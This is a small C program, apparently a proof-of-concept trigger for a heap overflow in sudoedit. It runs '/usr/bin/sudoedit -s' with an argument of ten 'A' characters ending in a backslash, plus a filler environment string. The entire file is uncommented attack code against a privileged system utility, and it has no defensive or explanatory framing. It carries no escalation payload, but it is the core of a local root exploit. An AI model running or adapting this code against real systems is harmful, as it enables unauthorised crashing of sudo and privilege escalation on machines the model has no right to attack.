#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#define SUDOEDIT_PATH "/usr/bin/sudoedit"
int main(){
    char *smash_a = calloc(10 + 2, 1);
    memset(smash_a, 'A', 10);
    smash_a[10] = '\\';	
    char *s_argv[]={
        "sudoedit", "-s", smash_a, NULL
    };
	char *s_envp[] = {"adsssssssssdasdasdasdasddddddddddddddddddddddddddddddddđ",NULL};
    execve(SUDOEDIT_PATH, s_argv,s_envp);
    return 0;
}